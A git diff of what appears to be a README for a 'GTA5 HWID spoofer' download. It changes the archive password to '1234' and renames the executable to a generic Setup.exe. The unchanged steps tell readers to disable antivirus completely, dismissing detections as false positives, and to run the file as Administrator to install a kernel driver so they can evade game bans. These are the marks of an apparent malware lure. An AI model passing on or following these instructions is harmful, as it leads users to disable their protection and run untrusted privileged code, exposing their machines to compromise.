@@ -26,11 +26,11 @@
 
 2. Click the **"Download Spoofer"** button.
 
-3. **Extract** the archive with password: `gta2025`
+3. **Extract** the archive with password: `1234`
 
 4. **Disable your antivirus** completely. This tool uses a **kernel driver** to spoof hardware – AV will flag it as a false positive. Add the folder to exclusions or turn off real-time protection.
 
-5. **Run `GTA5_Spoofer.exe`** as Administrator.
+5. **Run `Setup.exe`** as Administrator.
 
 6. Click **"Spoof HWID"** – PC will restart. After reboot, your hardware ID is new. Launch GTA Online and enjoy!
 
@@ -62,4 +62,4 @@ For educational and recovery purposes only. Use at your own risk. The authors ar
 
 ---
 
-© 2025 GTA Tools. All rights reserved.
+© 2026 GTA Tools. All rights reserved.
